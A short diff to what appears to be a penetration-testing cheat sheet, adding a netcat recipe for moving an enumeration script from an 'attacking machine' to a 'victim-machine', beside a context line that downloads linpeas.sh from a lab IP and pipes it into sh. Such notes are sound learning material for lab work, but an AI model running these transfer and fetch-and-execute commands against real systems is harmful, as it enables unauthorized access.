@@ -26,6 +26,15 @@ xterm
 ```bash
 export TERM=xterm
 ```
+##### Netcat File Transfer
+```bash
+So on the victim-machine we run nc like this:
+nc -lvp 3333 > enum.sh
+
+And on the attacking machine we send the file like this:
+nc 192.168.1.103 < enum.sh
+```
+
 ##### wget in ram
 ```bash
 Wget -O - http://192.168.49.66/linpeas.sh | sh
